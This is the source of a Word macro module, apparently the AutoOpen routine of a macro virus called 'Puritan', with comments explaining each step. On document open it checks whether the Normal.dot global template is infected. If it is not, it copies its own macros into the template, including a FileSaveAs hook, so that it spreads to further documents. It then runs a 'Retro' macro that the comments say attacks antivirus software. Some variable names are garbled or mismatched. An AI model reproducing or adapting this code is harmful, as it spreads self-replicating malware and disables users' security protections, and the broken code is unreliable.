   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim iM
   Dim i
   Dim Y
   Dim F$
   Dim S$
   On Error GoTo -1: On Error GoTo Z                         'Error Handler.
    iM = WordBasic.CountMacros(0, 0)                 'Count macros in Normal.Dot
    For i = 1 To M                         'Check if Normal.Dot (Global...
     If M___$(i, 0, 0) = "Puritan" Then Y = -1
     'End If                                'Template) is already infected.
    Next i

    If Not Y Then                          'If not infected copy all macros...
     F$ = WordBasic.[FileName$]()                      'from infected file to Normal.Dot...
     S$ = F$ + ":Puritan"                  '(Global Template).
    WordBasic.MacroCopy S$, "Global:Puritan"
     S$ = F$ + ":Rtr"
    WordBasic.MacroCopy S$, "Global:Retro"
     S$ = F$ + ":FSAB"
    WordBasic.MacroCopy S$, "Global:FileSaveAs"
     S$ = F$ + ":FSAB"
    WordBasic.MacroCopy S$, "Global:FSAB"
     S$ = F$ + ":AOB"
    WordBasic.MacroCopy S$, "Global:AOB"
     S$ = F$ + ":ToolsMacro"
    WordBasic.MacroCopy S$, "Global:ToolsMacro"
    End If

   WordBasic.ToolsMacro Name := "Retro", Run := 1, Show := 0, "Discription" := "", NewName := ""
                                           'After infection run the Retro macro...
                                           'to attack AV software.
   Z:


   End Sub
